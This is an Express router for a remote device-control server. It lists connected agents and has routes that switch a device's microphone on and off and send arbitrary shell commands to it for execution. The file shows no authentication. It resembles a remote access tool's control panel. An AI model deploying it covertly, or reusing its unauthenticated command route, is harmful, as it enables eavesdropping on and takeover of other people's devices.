import { Router } from "express";
import { agentManager } from "../server";
import crypto from "node:crypto";

const router = Router();

router.get("/", (req, res) => {

    const devices = agentManager.getAll();

    res.render("index", {
        devices
    });

});

router.get("/:id", (req, res) => {

    const device = agentManager.get(req.params.id);

    if (!device) {
        return res.status(404).render("404");
    }

    res.render("device", {
        device
    });

});
router.post(
    "/:id/microphone/start",
    (req, res) => {

        const agent =
            agentManager.get(req.params.id);

        if (!agent) {

            return res.status(404).json({
                error: "Device is offline"
            });

        }


        agent.socket.send(
            JSON.stringify({
                type: "microphone_start"
            })
        );


        res.json({
            success: true
        });

    }
);
router.post(
    "/:id/microphone/stop",
    (req, res) => {

        const agent =
            agentManager.get(req.params.id);

        if (!agent) {

            return res.status(404).json({
                error: "Device is offline"
            });

        }


        agent.socket.send(
            JSON.stringify({
                type: "microphone_stop"
            })
        );


        res.json({
            success: true
        });

    }
);
router.post("/:id/command", (req, res) => {
    const agent = agentManager.get(req.params.id);

    if (!agent) {
        return res.status(404).json({
            error: "Device is offline"
        });
    }

    const command = req.body.command;

    if (
        typeof command !== "string" ||
        command.trim() === ""
    ) {
        return res.status(400).json({
            error: "Command is required"
        });
    }

    const requestId = crypto.randomUUID();

    agent.socket.send(
        JSON.stringify({
            type: "command_execute",
            requestId,
            command
        })
    );

    res.json({
        success: true,
        requestId
    });
});

export default router;